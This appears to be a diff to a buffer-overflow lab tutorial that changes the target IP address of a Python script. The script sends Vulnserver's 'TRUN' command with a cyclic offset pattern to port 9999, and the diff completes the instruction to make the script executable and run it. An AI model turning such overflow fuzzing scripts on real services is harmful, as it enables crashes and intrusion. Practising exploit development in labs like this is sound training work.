@@ -21,7 +21,7 @@ offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A
         payload = "TRUN /.:/" + buffer
  
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(('192.168.1.35',9999))
+        s.connect(('192.168.0.106',9999))
         s.send(('TRUN /.:/' + offset))
         s.close()
 
@@ -30,4 +30,4 @@ offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A
         sys.exit()
 ```
 
-- Grant it executable permissio
+- Grant it executable permissions and run
